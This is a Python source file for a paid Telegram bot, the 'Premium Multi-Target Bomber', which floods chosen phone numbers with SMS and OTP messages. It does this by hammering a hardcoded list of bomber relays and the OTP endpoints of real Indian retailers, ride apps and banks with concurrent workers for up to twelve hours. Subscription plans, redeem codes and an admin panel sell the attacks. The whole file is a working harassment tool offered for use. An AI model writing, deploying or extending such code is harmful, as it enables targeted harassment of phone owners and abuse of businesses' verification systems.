import os
import sys
import types

# ========== CGI MODULE FIX ==========
class CGI:
    def parse_multipart(self, *args, **kwargs):
        return {}
    class FieldStorage:
        def __init__(self, *args, **kwargs):
            self.value = None
            self.filename = None
            self.file = None
            self.type = None
            self.headers = {}
        def __getattr__(self, name):
            return None

cgi_module = types.ModuleType('cgi')
cgi_module.parse_multipart = CGI().parse_multipart
cgi_module.FieldStorage = CGI.FieldStorage
cgi_module.__dict__.update({
    'parse_multipart': CGI().parse_multipart,
    'FieldStorage': CGI.FieldStorage
})
sys.modules['cgi'] = cgi_module

# ========== HTTPX FIX ==========
import httpx
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

_original_async_client_init = httpx.AsyncClient.__init__
def _patched_async_client_init(self, *args, **kwargs):
    for p in ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']:
        kwargs.pop(p, None)
    try:
        _original_async_client_init(self, *args, **kwargs)
    except TypeError:
        pass
httpx.AsyncClient.__init__ = _patched_async_client_init

_original_client_init = httpx.Client.__init__
def _patched_client_init(self, *args, **kwargs):
    for p in ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']:
        kwargs.pop(p, None)
    try:
        _original_client_init(self, *args, **kwargs)
    except TypeError:
        pass
httpx.Client.__init__ = _patched_client_init

# ========== MAIN IMPORTS ==========
import asyncio
import aiohttp
import time
import random
import string
from aiohttp import web
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# ========== MONGO IMPORTS ==========
from motor.motor_asyncio import AsyncIOMotorClient
from pymongo import MongoClient

# ========== ENV CONFIG ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
OWNER_ID = int(os.environ.get("OWNER_ID", ""))
ADMIN_ID = int(os.environ.get("ADMIN_ID", ""))
WELCOME_IMAGE = "https://i.postimg.cc/YCxyLJC7/file-000000001744820a98f207c5da99d202.png"

# 🔥 YAHI HAI MONGODB URL — Railway Variables se aayega
MONGO_URL = os.environ.get("MONGO_URL", "")
DB_NAME = os.environ.get("DB_NAME", "bomber_db")

if not MONGO_URL:
    print("❌ MONGO_URL environment variable set nahi hai!")
    print("👉 Railway → Variables mein MONGO_URL add karo")
    sys.exit(1)

# ========== MONGO CLIENTS ==========
mongo_client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
db = mongo_client[DB_NAME]
users_col = db["users"]
codes_col = db["redeem_codes"]

# Test connection
try:
    mongo_client.admin.command('ping')
    print("✅ MongoDB connected successfully!")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    sys.exit(1)

PLANS = {
    "standard": {"name": "Standard", "price": 149, "days": 30, "concurrent": 2, "max_duration": 300},
    "premium": {"name": "Premium", "price": 249, "days": 30, "concurrent": 5, "max_duration": 720},
    "ultimate": {"name": "Ultimate", "price": 349, "days": 30, "concurrent": 10, "max_duration": 720}
}

WORKING_APIS = [
    "https://panther-aura-bomber-999-blond.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://pantherbomberjs.pantherxofficial1.workers.dev/api?num={phone}&type=sms&workers=500",
    "https://mix-rootx-new.vercel.app/bomb?number={phone}&workers=500",
    "https://panther-v2-api.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://panther-x2.vercel.app/api?num={phone}&type=sms&workers=500",
    "https://lakhan-api-bom.hb3284008.workers.dev/?phone={phone}&workers=5000",
    "https://bomber.kingcc.qzz.io/bomb?key=urfaaan_omdivine&numbar={phone}&workers=5000",
    "https://www.gopinkcabs.com/app/cab/customer/login_admin_code?mobile={phone}",
    "https://www.haldiram.com/api/v2/otp/send?mobile={phone}",
    "https://dashboardapi.hashtagloyalty.com/v3/sign_up/create_otp?mobile={phone}",
    "https://api.healthmug.com/account/createotp?mobile={phone}",
    "https://homedeliverybackend.mpaani.com/auth/send-otp?mobile={phone}",
    "https://hometriangle.com/api/partner/xauth/signup/otp?mobile={phone}",
    "https://login.housing.com/api/v2/send-otp?mobile={phone}",
    "https://kukufm.com/api/v2/send_otp/?phone={phone}",
    "https://auth.mamaearth.in/v1/auth/initiate-signup?phone={phone}",
    "https://www.nobroker.in/api/v3/account/otp/send?mobile={phone}",
    "https://www.nykaa.com/app-api/index.php/customer/send_otp?mobile={phone}",
    "https://api.rapido.bike/apigw/v1/send-otp?phone={phone}",
    "https://api.swiggy.com/3/auth/otp?mobile={phone}",
    "https://www.tatacliq.com/api/auth/v1/otp/send?mobile={phone}",
    "https://www.urbancompany.com/api/v1/auth/otp?phone={phone}",
    "https://www.zomato.com/webroutes/auth/otp?phone={phone}",
    "https://www.flipkart.com/api/5/user/otp/generate?phone={phone}",
    "https://www.meesho.com/api/auth/otp?phone={phone}",
    "https://www.phonepe.com/api/otp?phone={phone}",
    "https://www.mobikwik.com/api/otp?phone={phone}",
    "https://www.cred.com/api/otp?phone={phone}",
    "https://www.hotstar.com/api/otp?phone={phone}",
    "https://www.sonyliv.com/api/otp?phone={phone}",
    "https://www.irctc.co.in/api/otp?mobile={phone}",
    "https://www.goibibo.com/api/otp?phone={phone}",
    "https://www.uber.com/api/otp?phone={phone}",
    "https://www.olacabs.com/api/otp?phone={phone}",
    "https://www.dominos.co.in/api/otp?phone={phone}",
    "https://www.pizzahut.co.in/api/otp?phone={phone}",
    "https://www.sbi.co.in/api/otp?mobile={phone}",
    "https://www.hdfcbank.com/api/otp?mobile={phone}",
    "https://www.icicibank.com/api/otp?mobile={phone}",
    "https://www.axisbank.com/api/otp?mobile={phone}",
    "https://www.kotak.com/api/otp?mobile={phone}",
]

def build_api_list():
    apis = []
    for api_url in WORKING_APIS:
        method = "GET" if any(x in api_url for x in ["panther", "bomber", "workers", "vercel", "lakhan", "kingcc"]) else "POST"
        api_obj = {
            "name": api_url.split("/")[2] if "://" in api_url else "API",
            "url": api_url.replace("{phone}", "{no}"),
            "method": method,
            "headers": {
                "User-Agent": "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
                "Accept": "application/json, text/plain, */*",
                "Content-Type": "application/json" if method == "POST" else "application/x-www-form-urlencoded",
            },
            "body": {}
        }
        apis.append(api_obj)
        for prefix in ["+91{no}", "91{no}"]:
            if prefix not in api_obj["url"]:
                var_obj = api_obj.copy()
                var_obj["url"] = api_obj["url"].replace("{no}", prefix)
                apis.append(var_obj)
    seen = set()
    unique = []
    for api in apis:
        if api["url"] not in seen:
            seen.add(api["url"])
            unique.append(api)
    return unique

APIS = build_api_list()


class Database:
    """MongoDB-backed database. Fully synchronous pymongo (fast enough)."""
    
    def __init__(self):
        self.temp_attack_data = {}
        # Indexes
        try:
            users_col.create_index("user_id", unique=True)
            users_col.create_index("protected_number")
            codes_col.create_index("code", unique=True)
        except Exception as e:
            print(f"⚠️ Index warning: {e}")

    def get_user(self, user_id):
        return users_col.find_one({"user_id": user_id})

    def add_user(self, user_id):
        if not self.get_user(user_id):
            try:
                users_col.insert_one({
                    "user_id": user_id,
                    "premium_expiry": None,
                    "premium_plan": "standard",
                    "protected_number": None
                })
            except Exception:
                pass

    def _parse_expiry(self, user):
        if user and user.get("premium_expiry"):
            try:
                return datetime.strptime(user["premium_expiry"], "%Y-%m-%d %H:%M:%S")
            except:
                return None
        return None

    def _get_active_plan(self, user):
        expiry = self._parse_expiry(user)
        if expiry and datetime.now() < expiry:
            plan = user.get("premium_plan") or "standard"
            return PLANS.get(plan, PLANS["standard"])
        return None

    def get_concurrent_limit(self, user_id):
        if user_id == OWNER_ID:
            return 10
        user = self.get_user(user_id)
        plan = self._get_active_plan(user)
        return plan["concurrent"] if plan else 0

    def get_max_duration(self, user_id):
        if user_id == OWNER_ID:
            return 720
        user = self.get_user(user_id)
        plan = self._get_active_plan(user)
        return plan["max_duration"] if plan else 0

    def get_plan_name(self, user_id):
        if user_id == OWNER_ID:
            return "Ultimate"
        user = self.get_user(user_id)
        plan = self._get_active_plan(user)
        return plan["name"] if plan else "Free"

    def get_expiry(self, user_id):
        user = self.get_user(user_id)
        expiry = self._parse_expiry(user)
        if expiry and datetime.now() < expiry:
            return user["premium_expiry"]
        return "Not Active"

    def is_premium(self, user_id):
        if user_id == OWNER_ID:
            return True
        user = self.get_user(user_id)
        return self._get_active_plan(user) is not None

    def add_premium(self, user_id, days, plan_type="standard"):
        current = datetime.now()
        user = self.get_user(user_id)
        stored = self._parse_expiry(user)
        if stored and stored > current:
            current = stored
        new_exp = current + timedelta(days=days)
        str_exp = new_exp.strftime("%Y-%m-%d %H:%M:%S")
        
        if not user:
            users_col.insert_one({
                "user_id": user_id,
                "premium_expiry": str_exp,
                "premium_plan": plan_type,
                "protected_number": None
            })
        else:
            users_col.update_one(
                {"user_id": user_id},
                {"$set": {"premium_expiry": str_exp, "premium_plan": plan_type}}
            )
        return str_exp

    def generate_code(self, days, plan_type="standard"):
        for _ in range(10):
            code = "PREMIUM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            try:
                codes_col.insert_one({
                    "code": code,
                    "days": days,
                    "plan_type": plan_type,
                    "is_used": 0
                })
                return code
            except Exception:
                continue
        raise Exception("Failed to generate unique code")

    def redeem(self, user_id, code):
        res = codes_col.find_one({"code": code})
        if not res or res.get("is_used") == 1:
            return False, 0, None, None
        days = res["days"]
        plan_type = res["plan_type"]
        try:
            codes_col.update_one({"code": code}, {"$set": {"is_used": 1}})
            exp_date = self.add_premium(user_id, days, plan_type)
            return True, days, plan_type, exp_date
        except Exception:
            return False, 0, None, None

    def protect(self, user_id, number):
        users_col.update_one(
            {"user_id": user_id},
            {"$set": {"protected_number": number}}
        )

    def unprotect(self, user_id):
        users_col.update_one(
            {"user_id": user_id},
            {"$set": {"protected_number": None}}
        )

    def is_protected(self, number):
        return users_col.find_one({"protected_number": number}) is not None

    def get_all_users(self):
        return [doc["user_id"] for doc in users_col.find({}, {"user_id": 1})]

    def get_stats(self):
        u = users_col.count_documents({})
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        premium = users_col.count_documents({"premium_expiry": {"$gt": now_str}})
        total_codes = codes_col.count_documents({})
        return u, premium, total_codes

    def set_attack_data(self, user_id, targets):
        self.temp_attack_data[user_id] = {'targets': targets, 'timestamp': time.time()}

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:
            return data['targets']
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]
        return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]


class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.db = Database()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
        ]

    async def _make_request(self, session, api, phone):
        try:
            url = api['url'].replace('{no}', phone)
            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = random.choice(self.user_agents)
            timeout = aiohttp.ClientTimeout(total=5)
            if api['method'].upper() == 'GET':
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    return True
            else:
                async with session.post(url, headers=headers, timeout=timeout, ssl=False) as r:
                    await r.read()
                    return True
        except:
            return False

    async def _worker_task(self, user_id, phone, api_list, end_time):
        async with aiohttp.ClientSession() as session:
            while time.time() < end_time:
                if user_id not in self.active_attacks or not self.active_attacks[user_id]["running"]:
                    break
                if phone not in self.active_attacks[user_id]["targets"]:
                    break
                random.shuffle(api_list)
                tasks = [self._make_request(session, api, phone) for api in api_list[:30]]
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                await asyncio.sleep(0.3)

    async def start_attack(self, user_id, targets, duration_minutes):
        if user_id in self.active_attacks:
            return False, "Attack already running"
        if not self.db.is_premium(user_id):
            return False, "Premium required"
        max_dur = self.db.get_max_duration(user_id)
        if duration_minutes > max_dur:
            return False, f"Max duration is {max_dur} minutes for your plan"
        concurrency = self.db.get_concurrent_limit(user_id)
        if concurrency == 0:
            return False, "Premium required"
        if len(targets) > concurrency:
            return False, f"Your plan allows max {concurrency} concurrent targets"
        
        for target in targets:
            if self.db.is_protected(target):
                return False, f"Number {target} is protected!"
        
        end_time = time.time() + (duration_minutes * 60)
        chunk_size = max(1, len(APIS) // concurrency)
        api_chunks = []
        for i in range(concurrency):
            start_idx = i * chunk_size
            end_idx = start_idx + chunk_size if i < concurrency - 1 else len(APIS)
            api_chunks.append(APIS[start_idx:end_idx])
        
        self.active_attacks[user_id] = {
            "targets": targets,
            "end_time": end_time,
            "running": True,
            "workers": {}
        }
        
        for target in targets:
            self.active_attacks[user_id]["workers"][target] = []
            for i in range(concurrency):
                task = asyncio.create_task(self._worker_task(user_id, target, api_chunks[i], end_time))
                self.active_attacks[user_id]["workers"][target].append(task)
        
        return True, f"Started attack on {len(targets)} target(s) with {concurrency}x workers each"

    async def stop_attack(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            for target_workers in self.active_attacks[user_id].get("workers", {}).values():
                for task in target_workers:
                    if not task.done():
                        task.cancel()
            del self.active_attacks[user_id]
            return True
        return False


manager = AttackManager()


async def web_server():
    async def handle(request):
        return web.Response(text="Bot is Alive! MongoDB connected.")
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", "8080"))
    for p in [port, 8080, 8081, 8082, 3000, 5000]:
        try:
            site = web.TCPSite(runner, '0.0.0.0', p)
            await site.start()
            print(f"✅ Web server on port {p}")
            return
        except:
            continue


def main_kb(user_id):
    kb = [
        [KeyboardButton("🚀 /mix"), KeyboardButton("📊 /status")],
        [KeyboardButton("👤 /account"), KeyboardButton("💳 /plan")],
        [KeyboardButton("🛡 /protect"), KeyboardButton("🔓 /unprotect")],
        [KeyboardButton("🔑 /redeem"), KeyboardButton("❓ /help")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("👑 Admin")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)


def multi_target_kb(user_id):
    max_targets = manager.db.get_concurrent_limit(user_id)
    buttons = []
    for i in range(1, min(max_targets, 10) + 1):
        buttons.append([InlineKeyboardButton(f"🎯 {i} Target(s)", callback_data=f"targets_{i}")])
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(buttons)


def duration_kb(user_id):
    max_dur = manager.db.get_max_duration(user_id)
    buttons = []
    row = []
    durations = [1, 5, 15, 30, 60, 120, 180, 240, 300, 360, 480, 600, 720]
    for minutes in durations:
        if minutes <= max_dur:
            label = f"{minutes}min" if minutes < 60 else ("1h" if minutes == 60 else f"{minutes//60}h")
            row.append(InlineKeyboardButton(label, callback_data=f"dur_{minutes}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
    if row:
        buttons.append(row)
    buttons.append([InlineKeyboardButton(f"⚡ {manager.db.get_concurrent_limit(user_id)}x Concurrent per target", callback_data="info")])
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(buttons)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    manager.db.add_user(uid)
    await update.message.reply_photo(WELCOME_IMAGE, caption="🔥 Welcome to Premium Multi-Target Bomber!\n\nUse /help for commands.", reply_markup=main_kb(uid))


async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium Required!\nUse /plan to buy or /redeem to activate.")
        return
    if uid in manager.active_attacks:
        await update.message.reply_text("⚠️ You already have an active attack!\nUse /status to check.")
        return
    max_targets = manager.db.get_concurrent_limit(uid)
    await update.message.reply_text(f"📞 Select number of targets to attack (Max: {max_targets}):", reply_markup=multi_target_kb(uid))
    context.user_data['waiting_for_target_count'] = True


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid in manager.active_attacks:
        info = manager.active_attacks[uid]
        left = int((info['end_time'] - time.time()) / 60)
        targets = ", ".join(info['targets'])
        await update.message.reply_text(f"🔥 ATTACK RUNNING\n🎯 Targets: {targets}\n📊 Count: {len(info['targets'])}\n⏳ Left: {left} min", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP ALL", callback_data="stop")]]))
    else:
        await update.message.reply_text("💤 No active attacks.")


async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await update.message.reply_text(
        f"👤 ACCOUNT\n🆔 {uid}\n"
        f"📋 Plan: {manager.db.get_plan_name(uid)}\n"
        f"📅 Expiry: {manager.db.get_expiry(uid)}\n"
        f"⚡ Concurrent: {manager.db.get_concurrent_limit(uid)}\n"
        f"⏰ Max Duration: {manager.db.get_max_duration(uid)}min"
    )


async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "💳 AVAILABLE SUBSCRIPTION PLANS\n\n"
    for key, p in PLANS.items():
        msg += f"🔹 {p['name']} Plan (₹{p['price']})\n"
        msg += f"   - Duration: {p['days']} Days\n"
        msg += f"   - Concurrent Targets: {p['concurrent']}\n"
        msg += f"   - Max Duration: {p['max_duration']} min\n\n"
    msg += "💡 Use /redeem if you have a code.\n💬 Contact @Monsterbhaiii or @skhgang1"
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👤 Contact Admin", url=f"tg://user?id={OWNER_ID}")]])
    await update.message.reply_text(msg, reply_markup=kb)


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔑 Send your premium code:\nFormat: PREMIUM-XXXXXXXX")
    context.user_data['waiting_for_redeem'] = True


async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium required!")
        return
    await update.message.reply_text("🛡 Send 10-digit number to protect:")
    context.user_data['waiting_for_protect'] = True


async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    manager.db.unprotect(update.effective_user.id)
    await update.message.reply_text("🔓 Number unprotected.")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """ℹ️ USER HELP

🚀 CORE
• /start - Main menu
• /mix - Multi-target attack
• /status - Live progress

👤 ACCOUNT
• /account - Your plan details
• /plan - All plans
• /redeem - Activate code

🛡️ PROTECTION
• /protect & /unprotect

💡 PLANS:
• Standard - 2 targets / 300min
• Premium - 5 targets / 720min
• Ultimate - 10 targets / 720min"""
    await update.message.reply_text(msg, reply_markup=main_kb(update.effective_user.id))


async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = update.message.text
    
    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
        await generate_key_logic(update, context, text)
        return
    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
        await broadcast_logic(update, context, text)
        return
    
    manager.db.add_user(uid)
    
    if text in ["🚀 /mix", "/mix"]:
        await mix_command(update, context)
    elif text in ["📊 /status", "/status"]:
        await status_command(update, context)
    elif text in ["👤 /account", "/account"]:
        await account_command(update, context)
    elif text in ["💳 /plan", "/plan"]:
        await plan_command(update, context)
    elif text in ["🔑 /redeem", "/redeem"]:
        await redeem_command(update, context)
    elif text in ["🛡 /protect", "/protect"]:
        await protect_command(update, context)
    elif text in ["🔓 /unprotect", "/unprotect"]:
        await unprotect_command(update, context)
    elif text in ["❓ /help", "/help"]:
        await help_command(update, context)
    elif text == "👑 Admin" and uid == OWNER_ID:
        await show_admin_panel(update, context)
    elif context.user_data.get('waiting_for_numbers') and text.strip():
        await process_numbers(update, context, text)
    elif context.user_data.get('waiting_for_redeem'):
        context.user_data['waiting_for_redeem'] = False
        success, days, plan, exp = manager.db.redeem(uid, text.strip().upper())
        if success:
            await update.message.reply_text(f"✅ Premium Activated!\n📋 Plan: {plan.upper()}\n📅 Expiry: {exp}")
        else:
            await update.message.reply_text("❌ Invalid or already used code.")
    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_protect'] = False
        manager.db.protect(uid, text)
        await update.message.reply_text(f"🛡 Protected: {text}")
    elif text == "/cancel":
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
            context.user_data.pop(k, None)
        manager.db.clear_attack_data(uid)
        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))


async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Standard Key (30d)", callback_data="adm_gen_standard")],
        [InlineKeyboardButton("🔑 Premium Key (30d)", callback_data="adm_gen_premium")],
        [InlineKeyboardButton("🔑 Ultimate Key (30d)", callback_data="adm_gen_ultimate")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 Statistics", callback_data="adm_stats")],
        [InlineKeyboardButton("🔧 Custom Key", callback_data="adm_custom_key")]
    ])
    await update.message.reply_text("👑 Admin Control Panel:", reply_markup=kb)


async def generate_key_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    if update.effective_user.id != OWNER_ID:
        return
    context.user_data['waiting_for_genkey'] = False
    try:
        parts = text.split()
        days = int(parts[0])
        plan = parts[1].lower() if len(parts) > 1 else "standard"
        if plan not in PLANS:
            plan = "standard"
        code = manager.db.generate_code(days, plan)
        await update.message.reply_text(f"✅ KEY GENERATED\n\n🔑 `{code}`\n📅 {days} days\n📋 {plan.upper()}", parse_mode="Markdown")
    except:
        await update.message.reply_text("❌ Format: `days plan`\nExample: `30 premium`", parse_mode="Markdown")


async def broadcast_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    if update.effective_user.id != OWNER_ID:
        return
    context.user_data['waiting_for_broadcast'] = False
    users = manager.db.get_all_users()
    success, failed = 0, 0
    msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    for uid_user in users:
        try:
            await context.bot.send_message(uid_user, f"📢 ANNOUNCEMENT\n\n{text}")
            success += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    await msg.edit_text(f"✅ DONE\n✅ Success: {success}\n❌ Failed: {failed}")


async def process_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
    uid = update.effective_user.id
    numbers = [n.strip() for n in text.replace(',', ' ').split() if n.strip().isdigit() and len(n.strip()) == 10]
    target_count = context.user_data.get('expected_targets', 0)
    if len(numbers) != target_count:
        await update.message.reply_text(f"❌ Send exactly {target_count} numbers.")
        return
    context.user_data['waiting_for_numbers'] = False
    manager.db.set_attack_data(uid, numbers)
    max_dur = manager.db.get_max_duration(uid)
    await update.message.reply_text(f"📞 Targets: {', '.join(numbers)}\n⏰ Select duration (Max: {max_dur}min):", reply_markup=duration_kb(uid))


async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    if data == "adm_gen_standard" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "standard")
        await query.message.reply_text(f"✅ STANDARD KEY\n`{code}`", parse_mode="Markdown")
    elif data == "adm_gen_premium" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "premium")
        await query.message.reply_text(f"✅ PREMIUM KEY\n`{code}`", parse_mode="Markdown")
    elif data == "adm_gen_ultimate" and uid == OWNER_ID:
        code = manager.db.generate_code(30, "ultimate")
        await query.message.reply_text(f"✅ ULTIMATE KEY\n`{code}`", parse_mode="Markdown")
    elif data == "adm_custom_key" and uid == OWNER_ID:
        context.user_data['waiting_for_genkey'] = True
        await query.message.reply_text("Send: `days plan`\nExample: `30 premium`", parse_mode="Markdown")
    elif data.startswith("targets_"):
        count = int(data.split("_")[1])
        context.user_data['waiting_for_target_count'] = False
        context.user_data['waiting_for_numbers'] = True
        context.user_data['expected_targets'] = count
        await query.edit_message_text(f"📞 Send {count} phone number(s):")
    elif data.startswith("dur_"):
        targets = manager.db.get_attack_data(uid)
        if not targets:
            await query.edit_message_text("❌ Session expired. Use /mix.")
            return
        duration = int(data.split("_")[1])
        success, msg = await manager.start_attack(uid, targets, duration)
        await query.edit_message_text(f"{'🚀 STARTED!' if success else '❌ ' + msg}\n🎯 {', '.join(targets) if success else ''}")
        manager.db.clear_attack_data(uid)
    elif data == "cancel_attack":
        manager.db.clear_attack_data(uid)
        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'expected_targets']:
            context.user_data.pop(k, None)
        await query.edit_message_text("❌ Cancelled.")
    elif data == "stop":
        if await manager.stop_attack(uid):
            await query.edit_message_text("🛑 Stopped.")
        else:
            await query.answer("No active attack.")
    elif data == "adm_broadcast" and uid == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await query.message.reply_text("📢 Send broadcast message:")
    elif data == "adm_stats" and uid == OWNER_ID:
        u, p, c = manager.db.get_stats()
        await query.message.reply_text(f"📊 STATS\n👥 Users: {u}\n⭐ Premium: {p}\n🔑 Codes: {c}")
    elif data == "info":
        await query.answer(f"⚡ {manager.db.get_concurrent_limit(uid)}x workers", show_alert=True)


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
        context.user_data.pop(k, None)
    manager.db.clear_attack_data(uid)
    await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))


async def run_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("mix", mix_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("account", account_command))
    app.add_handler(CommandHandler("plan", plan_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("protect", protect_command))
    app.add_handler(CommandHandler("unprotect", unprotect_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
    app.add_handler(CallbackQueryHandler(btn_handler))
    
    print("=" * 50)
    print("🔥 PREMIUM BOMBER Started (MongoDB)")
    print(f"📊 APIs: {len(APIS)}")
    print(f"🗄️  MongoDB: {DB_NAME}")
    print("=" * 50)
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    while True:
        await asyncio.sleep(3600)


async def main_async():
    asyncio.create_task(web_server())
    await run_bot()


def main():
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(main_async())
    except (KeyboardInterrupt, SystemExit):
        print("🛑 Stopped")
    except Exception as e:
        print(f"❌ Error: {e}")
        raise


if __name__ == "__main__":
    main()
